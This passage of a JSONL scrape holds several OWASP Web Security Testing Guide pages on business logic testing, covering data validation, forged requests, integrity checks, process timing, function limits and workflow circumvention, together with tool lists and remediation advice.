18033-1:2015 – Encryption Algorithms\n- ISO 18033-2:2015 – Asymmetric Ciphers\n- ISO 18033-3:2015 – Block Ciphers\n", "timestamp": "2025-10-24T11:39:55.673622"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/README.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/09-Testing_for_Weak_Cryptography/README.md", "content": "# 4.9 Testing for Weak Cryptography\n\n4.9.1 [Testing for Weak Transport Layer Security](01-Testing_for_Weak_Transport_Layer_Security.md)\n\n4.9.2 [Testing for Padding Oracle](02-Testing_for_Padding_Oracle.md)\n\n4.9.3 [Testing for Sensitive Information Sent via Unencrypted Channels](03-Testing_for_Sensitive_Information_Sent_via_Unencrypted_Channels.md)\n\n4.9.4 [Testing for Weak Encryption](04-Testing_for_Weak_Encryption.md)\n", "timestamp": "2025-10-24T11:39:55.855170"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/00-Introduction_to_Business_Logic.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/00-Introduction_to_Business_Logic.md", "content": "# Introduction to Business Logic\n\nTesting for business logic flaws in a multi-functional dynamic web application requires thinking in unconventional methods. If an application's authentication mechanism is developed with the intention of performing steps 1, 2, 3 in that specific order to authenticate a user. What happens if the user goes from step 1 straight to step 3? In this simplistic example, does the application provide access by failing open; deny access, or just error out with a 500 message?\n\nThere are many examples that can be made, but the one constant lesson is \"think outside of conventional wisdom\". This type of vulnerability cannot be detected by a vulnerability scanner and relies upon the skills and creativity of the penetration tester. In addition, this type of vulnerability is usually one of the hardest to detect, and usually application specific but, at the same time, usually one of the most detrimental to the application, if exploited.\n\nThe classification of business logic flaws has been under-studied; although exploitation of business flaws frequently happens in real-world systems, and many applied vulnerability researchers investigate them. The greatest focus is in web applications. There is debate within the community about whether these problems represent particularly new concepts, or if they are variations of well-known principles.\n\nTesting of business logic flaws is similar to the test types used by functional testers that focus on logical or finite state testing. These types of tests require that security professionals think a bit differently, develop abuse and misuse cases and use many of the testing techniques embraced by functional testers. Automation of business logic abuse cases is not possible and remains a manual art relying on the skills of the tester and their knowledge of the complete business process and its rules.\n\n## Business Limits and Restrictions\n\nConsider the rules for the business function being provided by the application. Are there any limits or restrictions on people's behavior? Then consider whether the application enforces those rules. It's generally pretty easy to identify the test and analysis cases to verify the application if you're familiar with the business. If you are a third-party tester, then you're going to have to use your common sense or ask the business if different operations should be allowed by the application.\n\nSometimes, in very complex applications, the tester will not have a full understanding of every aspect of the application initially. In these situations, it is best to have the client walk the tester through the application, so that they may gain a better understanding of the limits and intended functionality of the application before the actual test begins. Additionally, having a direct line to the developers (if possible) during testing will help out greatly, if any questions arise regarding the application's functionality.\n\n## Challenges of Logic Testing\n\nAutomated tools find it hard to understand context, hence it's up to a person to perform these kinds of tests. The following two examples will illustrate how understanding the functionality of the application, the developer's intentions, and some creative \"out-of-the-box\" thinking can break the application's logic. The first example starts with a simplistic parameter manipulation, whereas the second is a real world example of a multi-step process leading to completely subverting the application.\n\n**Example 1**:\n\nSuppose an e-commerce site allows users to select items to purchase, view a summary page and then tender the sale. What if an attacker was able to go back to the summary page, maintaining their same valid session and inject a lower cost for an item and complete the transaction, and then check out?\n\n**Example 2**:\n\nHolding/locking resources and keeping others from purchasing these items online may result in attackers purchasing items at a lower price. The countermeasure to this problem is to implement timeouts and mechanisms to ensure that only the correct price can be charged.\n\n**Example 3**:\n\nWhat if a user was able to start a transaction linked to their club/loyalty account and then after points have been added to their account cancel out of the transaction? Will the points/credits still be applied to their account?\n\n## Tools\n\nWhile there are tools for testing and verifying that business processes are functioning correctly in valid situations these tools are incapable of detecting logical vulnerabilities. For example, tools have no means of detecting if a user is able to circumvent the business process flow through editing parameters, predicting resource names or escalating privileges to access restricted resources nor do they have any mechanism to help the human testers to suspect this state of affairs.\n\nThe following are some common tool types that can be useful in identifying business logic issues.\n\nWhen installing addons you should always be diligent in considering the permissions they request and your browser usage habits.\n\n### Intercepting Proxy\n\nTo Observe the Request and Response Blocks of HTTP Traffic\n\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)\n- [Burp Proxy](https://portswigger.net/burp)\n\n### Web Browser Plug-ins\n\nTo view and modify HTTP/HTTPS headers, post parameters, and observe the DOM of the Browser\n\n- [Tamper Data for FF Quantum](https://addons.mozilla.org/en-US/firefox/addon/tamper-data-for-ff-quantum)\n- [Tamper Chrome (for Google Chrome)](https://chrome.google.com/webstore/detail/tamper-chrome-extension/hifhgpdkfodlpnlmlnmhchnkepplebkb)\n\n## Miscellaneous Test Tools\n\n- [Web Developer toolbar](https://chrome.google.com/webstore/detail/bfbameneiokkgbdmiekhjnmfkcnldhhm)\n    - The Web Developer extension adds a toolbar button to the browser with various web developer tools. This is the official port of the Web Developer extension for Firefox.\n- [HTTP Request Maker for Chrome](https://chrome.google.com/webstore/detail/kajfghlhfkcocafkcjlajldicbikpgnp)\n- [HTTP Request Maker for Firefox](https://addons.mozilla.org/en-US/firefox/addon/http-request-maker)\n    - Request Maker is a tool for penetration testing. With it you can easily capture requests made by web pages, tamper with the URL, headers and POST data and, of course, make new requests\n- [Cookie Editor for Chrome](https://chrome.google.com/webstore/detail/fngmhnnpilhplaeedifhccceomclgfbg)\n- [Cookie Editor for Firefox](https://addons.mozilla.org/en-US/firefox/addon/cookie-editor)\n    - Cookie Editor is a cookie manager. You can add, delete, edit, search, protect, and block cookies\n\n## References\n\n### Whitepapers\n\n- [The Common Misuse Scoring System (CMSS): Metrics for Software Feature Misuse Vulnerabilities - NISTIR 7864](https://csrc.nist.gov/publications/detail/nistir/7864/final)\n- [Finite State testing of Graphical User Interfaces, Fevzi Belli](https://pdfs.semanticscholar.org/b57c/6c8022abfd2cb17ec785d3622027b3edfaaf.pdf)\n- [Principles and Methods of Testing Finite State Machines - A Survey, David Lee, Mihalis Yannakakis](https://ieeexplore.ieee.org/document/533956)\n- [Security Issues in Online Games, Jianxin Jeff Yan and Hyun-Jin Choi](https://www.researchgate.net/publication/220677013_Security_issues_in_online_games)\n- [Securing Virtual Worlds Against Real Attack, Dr. Igor Muttik, McAfee](https://www.info-point-security.com/open_downloads/2008/McAfee_wp_online_gaming_0808.pdf)\n- [Seven Business Logic Flaws That Put Your Website At Risk – Jeremiah Grossman Founder and CTO, WhiteHat Security](https://www.slideshare.net/jeremiahgrossman/seven-business-logic-flaws-that-put-your-website-at-risk-harvard-07062008)\n- [Toward Automated Detection of Logic Vulnerabilities in Web Applications - Viktoria Felmetsger Ludovico Cavedon Christopher Kruegel Giovanni Vigna](https://www.usenix.org/legacy/event/sec10/tech/full_papers/Felmetsger.pdf)\n\n### OWASP Related\n\n- [How to Prevent Business Flaws Vulnerabilities in Web Applications, Marco Morana](https://www.slideshare.net/slideshow/issa-louisville-2010morana/5391600)\n\n### Useful Sites\n\n- [Business logic](https://en.wikipedia.org/wiki/Business_logic)\n- [Business Logic Flaws and Yahoo Games](https://blog.jeremiahgrossman.com/2006/12/business-logic-flaws.html)\n- [CWE-840: Business Logic Errors](https://cwe.mitre.org/data/definitions/840.html)\n- [Defying Logic: Theory, Design, and Implementation of Complex Systems for Testing Application Logic](https://pdfs.semanticscholar.org/d14a/18f08f6488f903f2f691a1d159e95d8ee04f.pdf)\n\n### Books\n\n- [The Decision Model: A Business Logic Framework Linking Business and Technology, By Barbara Von Halle, Larry Goldberg, Published by CRC Press, ISBN1420082817 (2010)](https://isbnsearch.org/isbn/1420082817)\n", "timestamp": "2025-10-24T11:39:56.390663"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation.md", "content": "# Test Business Logic Data Validation\n\n|ID          |\n|------------|\n|WSTG-BUSL-01|\n\n## Summary\n\nThe application must ensure that only logically valid data can be entered at the frontend as well as directly to the server-side of an application or system. Only verifying data on the client/frontend may leave applications vulnerable to server injections through proxies or at handoffs with other systems. This is different from simply performing Boundary Value Analysis (BVA) in that it is more difficult and in most cases cannot be simply verified at the entry point, but usually requires checking some other system.\n\nFor example: An application may ask for your Social Security Number. In BVA, the application should check formats and semantics (is the value 9 digits long, not negative, and not all 0's) for the data entered, but there are logic considerations also. SSNs are grouped and categorized. Is this person on a death file? Are they from a certain part of the country?\n\nVulnerabilities related to business data validation is unique in that they are application specific and different from the vulnerabilities related to forging requests in that they are more concerned about logical data as opposed to simply breaking the business logic workflow.\n\nThe frontend and the backend of the application should be verifying and validating that the data it has, is using, and is passing along is logically valid. Even if the user provides valid data to an application the business logic may make the application behave differently depending on data or circumstances.\n\n### Example 1\n\nSuppose you manage a multi-tiered e-commerce site that allows users to order carpet. The user selects their carpet, enters the size, makes the payment, and the frontend application has verified that all entered information is correct and valid for contact information, size, make and color of the carpet. But, the business logic in the background has two paths, if the carpet is in stock it is directly shipped from your warehouse, but if it is out of stock in your warehouse a call is made to a partner’s system and if they have it in-stock they will ship the order from their warehouse and reimbursed by them. What happens if an attacker is able to continue a valid in-stock transaction and send it as out-of-stock to your partner? What happens if an attacker is able to get in the middle and send messages to the partner warehouse ordering carpet without payment?\n\n### Example 2\n\nMany credit card systems are now downloading account balances nightly so the customers can check out more quickly for amounts under a certain value. The inverse is also true. If I pay my credit card off in the morning I may not be able to use the available credit in the evening. Another example may be if I use my credit card at multiple locations very quickly it may be possible to exceed my limit if the systems are basing decisions on last night’s data.\n\n### Example 3\n\n**[Distributed Denial of Dollar (DDo$)](https://news.hitb.org/content/pirate-bay-proposes-distributed-denial-dollars-attack-ddo):**\nThis was a campaign that was proposed by the founder of the site \"The Pirate Bay\" against the law firm who brought prosecutions against \"The Pirate Bay\". The goal was to take advantage of errors in the design of business features and in the process of credit transfer validation.\n\nThis attack was performed by sending very small amounts of money of 1 SEK ($0.13 USD) to the law firm.\nThe bank account to which the payments were directed had only 1000 free transfers, after which any transfers have a surcharge for the account holder (2 SEK). After the first thousand internet transactions every 1 SEK donation to the law firm will actually end up costing it 1 SEK instead.\n\n## Test Objectives\n\n- Identify data injection points.\n- Validate that all checks are occurring on the backend and can't be bypassed.\n- Attempt to break the format of the expected data and analyze how the application is handling it.\n\n## How to Test\n\n### Generic Test Method\n\n- Review the project documentation and use exploratory testing looking for data entry points or hand off points between systems or software.\n- Once found try to insert logically invalid data into the application/system.\nSpecific Testing Method:\n- Perform frontend GUI Functional Valid testing on the application to ensure that the only \"valid\" values are accepted.\n- Using an intercepting proxy observe the HTTP POST/GET looking for places that variables such as cost and quantity are passed. Specifically, look for \"hand-offs\" between application/systems that may be possible injection or tamper points.\n- Once variables are found start interrogating the field with logically \"invalid\" data, such as social security numbers or unique identifiers that do not exist or that do not fit the business logic. This testing verifies that the server functions properly and does not accept logically invalid data.\n\n## Related Test Cases\n\n- All [Input Validation](../07-Input_Validation_Testing/README.md) test cases.\n- [Testing for Account Enumeration and Guessable User Account](../03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md).\n- [Testing for Bypassing Session Management Schema](../06-Session_Management_Testing/01-Testing_for_Session_Management_Schema.md).\n- [Testing for Exposed Session Variables](../06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables.md).\n\n## Remediation\n\nThe application/system must ensure that only \"logically valid\" data is accepted at all input and hand off points of the application or system and data is not simply trusted once it has entered the system.\n\n## Tools\n\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)\n- [Burp Suite](https://portswigger.net/burp)\n\n## References\n\n- [OWASP Proactive Controls (C5) - Validate All Inputs](https://owasp.org/www-project-proactive-controls/v3/en/c5-validate-inputs)\n- [OWASP Cheat Sheet Series - Input_Validation_Cheat_Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)\n", "timestamp": "2025-10-24T11:39:56.476737"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/02-Test_Ability_to_Forge_Requests.md", "content": "# Test Ability to Forge Requests\n\n|ID          |\n|------------|\n|WSTG-BUSL-02|\n\n## Summary\n\nForging requests is a method that attackers use to circumvent the frontend GUI application to directly submit information for backend processing. The goal of the attacker is to send HTTP POST/GET requests through an intercepting proxy with data values that are not supported, guarded against, or expected by the application's business logic. Some examples of forged requests include exploiting guessable or predictable parameters or exposing \"hidden\" features and functionality such as enabling debugging or presenting special screens or windows that are very useful during development but may leak information or bypass the business logic.\n\nVulnerabilities related to the ability to forge requests are unique to each application and different from business logic data validation in that its focus is on breaking the business logic workflow.\n\nApplications should have logic checks in place to prevent the system from accepting forged requests that may allow attackers the opportunity to exploit the business logic, process, or flow of the application. Request forgery is nothing new; the attacker uses an intercepting proxy to send HTTP POST/GET requests to the application. Through request forgeries attackers may be able to circumvent the business logic or process by finding, predicting and manipulating parameters to make the application think a process or task has or has not taken place.\n\nAlso, forged requests may allow subversion of programmatic or business logic flow by invoking \"hidden\" features or functionality such as debugging initially used by developers and testers sometimes referred to as an [\"Easter egg\"](https://en.wikipedia.org/wiki/Easter_egg_(media)). \"An Easter egg is an intentional inside joke, hidden message, or feature in a work such as a computer program, movie, book, or crossword. According to game designer Warren Robinett, the term was coined at Atari by personnel who were alerted to the presence of a secret message which had been hidden by Robinett in his already widely distributed game, Adventure. The name has been said to evoke the idea of a traditional Easter egg hunt.\"\n\n### Example 1\n\nSuppose an e-commerce theater site allows users to select their ticket, apply a onetime 10% Senior discount on the entire sale, view the subtotal and tender the sale. If an attacker is able to see through a proxy that the application has a hidden field (of 1 or 0) used by the business logic to determine if a discount has been taken already or not. The attacker is then able to submit the 1 or \"no discount has been taken\" value multiple times to take advantage of the same discount multiple times.\n\n### Example 2\n\nSuppose an online video game pays out tokens for points scored for finding pirate's treasure, pirates, and for each level completed. These tokens can later be exchanged for prizes. Additionally each level's points have a multiplier value equal to the level. If an attacker was able to see through a proxy that the application has a hidden field used during development and testing to quickly get to the highest levels of the game they could quickly get to the highest levels and accumulate unearned points quickly.\n\nAlso, if an attacker was able to see through a proxy that the application has a hidden field used during development and testing to enable a log that indicated where other online players, or hidden treasures were in relation to the attacker, they would then be able to quickly go to these locations and score points.\n\n## Test Objectives\n\n- Review the project documentation looking for guessable, predictable, or hidden functionality of fields.\n- Insert logically valid data in order to bypass normal business logic workflow.\n\n## How to Test\n\n### Through Identifying Guessable Values\n\n- Using an intercepting proxy observe the HTTP POST/GET looking for some indication that values are incrementing at a regular interval or are easily guessable.\n- If it is found that some value is guessable this value may be changed and one may gain unexpected visibility.\n\n### Through Identifying Hidden Options\n\n- Using an intercepting proxy observe the HTTP POST/GET looking for some indication of hidden features such as debug that can be switched on or activated.\n- If any are found try to guess and change these values to get a different application response or behavior.\n\n## Related Test Cases\n\n- [Testing for Exposed Session Variables](../06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables.md)\n- [Testing for Cross Site Request Forgery (CSRF)](../06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md)\n- [Testing for Account Enumeration and Guessable User Account](../03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md)\n\n## Remediation\n\nThe application must be smart enough and designed with business logic that will prevent attackers from predicting and manipulating parameters to subvert programmatic or business logic flow, or exploiting hidden/undocumented functionality such as debugging.\n\n## Tools\n\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)\n- [Burp Suite](https://portswigger.net/burp)\n\n## References\n\n- [Easter egg](https://en.wikipedia.org/wiki/Easter_egg_(media))\n- [Top 10 Software Easter Eggs](https://lifehacker.com/371083/top-10-software-easter-eggs)\n", "timestamp": "2025-10-24T11:39:56.547801"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/03-Test_Integrity_Checks.md", "content": "# Test Integrity Checks\n\n|ID          |\n|------------|\n|WSTG-BUSL-03|\n\n## Summary\n\nMany applications are designed to display different fields depending on the user or situation by leaving some inputs hidden. However, in many cases it is possible to submit hidden field values to the server using a proxy. In these cases the server-side controls must be smart enough to perform relational or server-side edits to ensure that the proper data is allowed to the server based on user and application specific business logic.\n\nAdditionally, the application must not depend on non-editable controls, drop-down menus or hidden fields for business logic processing because these fields remain non-editable only in the context of the browsers. Users may be able to edit their values using proxy editor tools and try to manipulate business logic. If the application exposes values related to business rules like quantity, etc. as non-editable fields, it must maintain a copy on the server-side and use the same for business logic processing. Finally, aside from application/system data, log systems must be secured to prevent read, writing, and updating.\n\nBusiness logic integrity check vulnerabilities are unique in that these misuse cases are application specific and if users are able to make changes, one should only be able to write or update/edit specific artifacts at specific times as per the business process logic.\n\nThe application must be smart enough to check for relational edits and not allow users to submit information directly to the server that is not valid, trusted because it came from a non-editable controls or the user is not authorized to submit through the frontend. Additionally, system artifacts such as logs must be \"protected\" from unauthorized read, writing and removal.\n\n### Example 1\n\nImagine an ASP.NET GUI application that only allows the admin user to change the password for other users in the system. The admin user will see the username and password fields to enter a username and password while other users will not see either field. However, if a non admin user submits information in the username and password field through a proxy they may be able to \"trick\" the server into believing that the request has come from an admin user and change password of other users.\n\n### Example 2\n\nMost web applications have dropdown lists making it easy for the user to quickly select their state, month of birth, etc. Suppose a Project Management application allowed users to login and depending on their privileges presented them with a drop down list of projects they have access to. What happens if an attacker finds the name of another project that they should not have access to and submits the information via a proxy. Will the application give access to the project? They should not have access even though they skipped an authorization business logic check.\n\n### Example 3\n\nSuppose the motor vehicle administration system required an employee initially verify each citizens' documentation and information when they issue an identification or driver's license. At this point the business process has created data with a high level of integrity as the integrity of submitted data is checked by the employees. Now suppose the application is moved to the internet so employees can log on for full service or citizens can log on for a reduced self-service application to update certain information. At this point an attacker may be able to use an intercepting proxy to add or update data that they should not have access to and they could destroy the integrity of the data by stating that the citizen was not married but supplying data for a spouse’s name. This type of inserting or updating of unverified data destroys the data integrity and might have been prevented if the business process logic was followed.\n\n### Example 4\n\nMany systems include logging for auditing and troubleshooting purposes. But, how good/valid is the information in these logs? Can they be manipulated by attackers either intentionally or accidentally having their integrity destroyed?\n\n## Test Objectives\n\n- Review the project documentation for components of the system that move, store, or handle data.\n- Determine what type of data is logically acceptable by the component and what types the system should guard against.\n- Determine who should be allowed to modify or read that data in each component.\n- Attempt to insert, update, or delete data values used by each component that should not be allowed per the business logic workflow.\n\n## How to Test\n\n### Specific Testing Method 1\n\n- Using a proxy capture HTTP traffic looking for hidden fields.\n- If a hidden field is found, see how these fields compare with the GUI application and start interrogating this value through the proxy by submitting different data values trying to circumvent the business process and manipulate values you were not intended to have access to.\n\n### Specific Testing Method 2\n\n- Using a proxy capture HTTP traffic looking for a place to insert information into areas of the application that are non-editable.\n- If it is found, see how these fields compare with the GUI application and start interrogating this value through the proxy by submitting different data values trying to circumvent the business process and manipulate values you were not intended to have access to.\n\n### Specific Testing Method 3\n\n- List components of the application or system that could be impacted, for example logs or databases.\n- For each component identified, try to read, edit or remove its information. For example log files should be identified and Testers should try to manipulate the data/information being collected.\n\n## Related Test Cases\n\nAll [Input Validation](../07-Input_Validation_Testing/README.md) test cases.\n\n## Remediation\n\nThe application should follow strict access controls on how data and artifacts can be modified and read, and through trusted channels that ensure the integrity of the data. Proper logging should be set in place to review and ensure that no unauthorized access or modification is happening.\n\n## Tools\n\n- Various system/application tools such as editors and file manipulation tools.\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)\n- [Burp Suite](https://portswigger.net/burp)\n\n## References\n\n- [Implementing Referential Integrity and Shared Business Logic in a RDB](https://agiledata.org/essays/referentialIntegrity.html)\n- [On Rules and Integrity Constraints in Database Systems](https://www.comp.nus.edu.sg/~lingtw/papers/IST92.teopk.pdf)\n- [Use referential integrity to enforce basic business rules in Oracle](https://www.techrepublic.com/article/use-referential-integrity-to-enforce-basic-business-rules-in-oracle/)\n- [Maximizing Business Logic Reuse with Reactive Logic](https://dzone.com/articles/maximizing-business-logic)\n", "timestamp": "2025-10-24T11:39:56.648418"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/04-Test_for_Process_Timing.md", "content": "# Test for Process Timing\n\n|ID          |\n|------------|\n|WSTG-BUSL-04|\n\n## Summary\n\nIt is possible that attackers can gather information on an application by monitoring the time it takes to complete a task or give a response. Additionally, attackers may be able to manipulate and break designed business process flows by simply keeping active sessions open and not submitting their transactions in the \"expected\" time frame.\n\nProcess timing logic vulnerabilities are unique in that these manual misuse cases should be created considering execution and transaction timing that are application/system specific.\n\nProcessing timing may give/leak information on what is being done in the application/system background processes. If an application allows users to guess what the particular next outcome will be by processing time variations, users will be able to adjust accordingly and change behavior based on the expectation and \"game the system\".\n\n### Example 1\n\nVideo gambling/slot machines may take longer to process a transaction just prior to a large payout. This would allow astute gamblers to gamble minimum amounts until they see the long process time which would then prompt them to bet the maximum.\n\n### Example 2\n\nMany system log on processes ask for the username and password. If you look closely you may be able to see that entering an invalid username and invalid user password takes more time to return an error than entering a valid username and invalid user password. This may allow the attacker to know if they have a valid username and not need to rely on the GUI message.\n\n![Example Control Flow of Login Form](images/Control_Flow_of_Login_Form.jpg)\\\n*Figure 4.10.4-1: Example Control Flow of Login Form*\n\n### Example 3\n\nMost Arenas or travel agencies have ticketing applications that allow users to purchase tickets and reserve seats. When the user requests the tickets, seats they pick are locked or reserved pending payment. What if an attacker keeps reserving seats but not checking out? Will the seats be released, or will no tickets be sold? Some ticket vendors now only allow users 5 minutes to complete a transaction or the transaction is invalidated.\n\n### Example 4\n\nSuppose a precious metals e-commerce site allows users to make purchases with a price quote based on market price at the time they log on. What if an attacker logs on and places an order but does not complete the transaction until later in the day only if the price of the metals goes up? Will the attacker get the initial lower price?\n\n## Test Objectives\n\n- Review the project documentation for system functionality that may be impacted by time.\n- Develop and execute misuse cases.\n\n## How to Test\n\nThe tester should identify which processes are dependent on time, whether it was a window for a task to be completed, or if it was execution time between two processes that could allow the bypass of certain controls.\n\nFollowing that, it is best to automate the requests that will abuse the above discovered processes, as tools are better fit to analyze the timing and are more precise than manual testing. If this is not possible, manual testing could still be used.\n\nThe tester should draw a diagram of how the process flows, the injection points, and prepare the requests before hand to launch them at the vulnerable processes. Once done, close analysis should be done to identify differences in the process execution, and if the process is misbehaving against the agreed upon business logic.\n\n## Related Test Cases\n\n- [Testing for Cookies Attributes](../06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.md)\n- [Test Session Timeout](../06-Session_Management_Testing/07-Testing_Session_Timeout.md)\n\n## Remediation\n\nDevelop applications with processing time in mind. If attackers could possibly gain some type of advantage from knowing the different processing times and results add extra steps or processing so that no matter the results they are provided in the same time frame.\n\nAdditionally, the application/system must have mechanism in place to not allow attackers to extend transactions over an \"acceptable\" amount of time. This may be done by canceling or resetting transactions after a specified amount of time has passed like some ticket vendors are now using.\n", "timestamp": "2025-10-24T11:39:56.706421"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits.md", "content": "# Test Number of Times a Function Can Be Used Limits\n\n|ID          |\n|------------|\n|WSTG-BUSL-05|\n\n## Summary\n\nMany of the problems that applications are solving require limits to the number of times a function can be used or action can be executed. Applications must be \"smart enough\" to not allow the user to exceed their limit on the use of these functions since in many cases each time the function is used the user may gain some type of benefit that must be accounted for to properly compensate the owner. For example: an eCommerce site may only allow a users apply a discount once per transaction, or some applications may be on a subscription plan and only allow users to download three complete documents monthly.\n\nVulnerabilities related to testing for the function limits are application specific and misuse cases must be created that strive to exercise parts of the application/functions/actions more than the allowable number of times.\n\nAttackers may be able to circumvent the business logic and execute a function more times than \"allowable\" exploiting the application for personal gain.\n\n### Example\n\nSuppose an eCommerce site allows users to take advantage of any one of many discounts on their total purchase and then proceed to checkout and tendering. What happens of the attacker navigates back to the discounts page after taking and applying the one \"allowable\" discount? Can they take advantage of another discount? Can they take advantage of the same discount multiple times?\n\n## Test Objectives\n\n- Identify functions that must set limits to the times they can be called.\n- Assess if there is a logical limit set on the functions and if it is properly validated.\n\n## How to Test\n\n- Review the project documentation and use exploratory testing looking for functions or features in the application or system that should not be executed more that a single time or specified number of times during the business logic workflow.\n- For each of the functions and features found that should only be executed a single time or specified number of times during the business logic workflow, develop abuse/misuse cases that may allow a user to execute more than the allowable number of times. For example, can a user navigate back and forth through the pages multiple times executing a function that should only execute once? or can a user load and unload shopping carts allowing for additional discounts.\n\n## Related Test Cases\n\n- [Testing for Account Enumeration and Guessable User Account](../03-Identity_Management_Testing/04-Testing_for_Account_Enumeration_and_Guessable_User_Account.md)\n- [Testing for Weak lock out mechanism](../04-Authentication_Testing/03-Testing_for_Weak_Lock_Out_Mechanism.md)\n\n## Remediation\n\nThe application should set hard controls to prevent limit abuse. This can be achieved by setting a coupon to be no longer valid on the database level, to set a counter limit per user on the backend or database level, as all users should be identified through a session, whichever is better to the business requirement.\n\n## References\n\n- [Gold Trading Was Temporarily Halted On The CME This Morning](https://www.businessinsider.com/gold-halted-on-cme-for-stop-logic-event-2013-10)\n", "timestamp": "2025-10-24T11:39:56.762886"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/10-Business_Logic_Testing/06-Testing_for_the_Circumvention_of_Work_Flows.md", "content": "# Testing for the Circumvention of Work Flows\n\n|ID          |\n|------------|\n|WSTG-BUSL-06|\n\n## Summary\n\nWorkflow vulnerabilities involve any type of vulnerability that allows the attacker to misuse an application/system in a way that will allow them to circumvent (not follow) the designed/intended workflow.\n\n[Definition of a workflow on Wikipedia](https://en.wikipedia.org/wiki/Workflow):\n\n> A workflow consists of a sequence of connected steps where each step follows without delay or gap and ends just before the subsequent step may begin. It is a depiction of a sequence of operations, declared as work of a person or group, an organization of staff, or one or more simple or complex mechanisms. Workflow may be seen as any abstraction of real work.\n\nThe application’s business logic must require that the user complete specific steps in the correct/specific order and if the workflow is terminated without correctly completing, all actions and spawned actions are \"rolled back\" or canceled. Vulnerabilities related to the circumvention of workflows or bypassing the correct business logic workflow are unique in that they are very application/system specific and careful manual misuse cases must be developed using requirements and use cases.\n\nThe applications business process must have checks to ensure that the user's transactions/actions are proceeding in the correct/acceptable order and if a transaction triggers some sort of action, that action will be \"rolled back\" and removed if the transaction is not successfully completed.\n\n### Example 1\n\nMany of us receive some type of \"club/loyalty points\" for purchases from grocery stores and gas stations. Suppose a user was able to start a transaction linked to their account and then after points have been added to their club/loyalty account cancel out of the transaction or remove items from their \"basket\" and tender. In this case the system either should not apply points/credits to the account until it is tendered or points/credits should be \"rolled back\" if the point/credit increment does not match the final tender. With this in mind, an attacker may start transactions and cancel them to build their point levels without actually buying anything.\n\n### Example 2\n\nAn electronic bulletin board system may be designed to ensure that initial posts do not contain profanity based on a list that the post is compared against. If a word on a deny list is found in the user entered text the submission is not posted. But, once a submission is posted the submitter can access, edit, and change the submission contents to include words included in the profanity/deny list since on edit the posting is never compared again. Keeping this in mind, attackers may open an initial blank or minimal discussion then add in whatever they like as an update.\n\n## Test Objectives\n\n- Review the project documentation for methods to skip or go through steps in the application process in a different order from the intended business logic flow.\n- Develop a misuse case and try to circumvent every logic flow identified.\n\n## How to Test\n\n### Testing Method 1\n\n- Start a transaction going through the application past the points that triggers credits/points to the users account.\n- Cancel out of the transaction or reduce the final tender so that the point values should be decreased and check the points/credit system to ensure that the proper points/credits were recorded.\n\n### Testing Method 2\n\n- On a content management or bulletin board system enter and save valid initial text or values.\n- Then try to append, edit and remove data that would leave the existing data in an invalid state or with invalid values to ensure that the user is not allowed to save the incorrect information. Some \"invalid\" data or information may be specific words (profanity) or specific topics (such as political issues).\n\n## Related Test Cases\n\n- [Testing Directory Traversal/File Include](../05-Authorization_Testing/01-Testing_Directory_Traversal_File_Include.md)\n- [Testing for Bypassing Authorization Schema](../05-Authorization_Testing/02-Testing_for_Bypassing_Authorization_Schema.md)\n- [Testing for Bypassing Session Management Schema](../06-Session_Management_Testing/01-Testing_for_Session_Management_Schema.md)\n- [Test Business Logic Data Validation](01-Test_Business_Logic_Data_Validation.md)\n- [Test Ability to Forge Requests](02-Test_Ability_to_Forge_Requests.md)\n- [Test Integrity Checks](03-Test_Integrity_Checks.md)\n- [Test for Process Timing](04-Test_for_Process_Timing.md)\n- [Test Number of Times a Function Can be Used Limits](05-Test_Number_of_Times_a_Function_Can_Be_Used_Limits.md)\n- [Test Defenses Against Application Mis-use](07-Test_Defenses_Against_Application_Misuse.md)\n- [Test Upload of Unexpected File Types](08-Test_Upload_of_Unexpected_File_Types.md)\n- [Test Upload of Malicious Files](09-Test_Upload_of_Malicious_Files.md)\n\n## Remediation\n\nThe application must be self-aware and have checks in place ensuring that the users complete each step in the work flow process in the correct order and 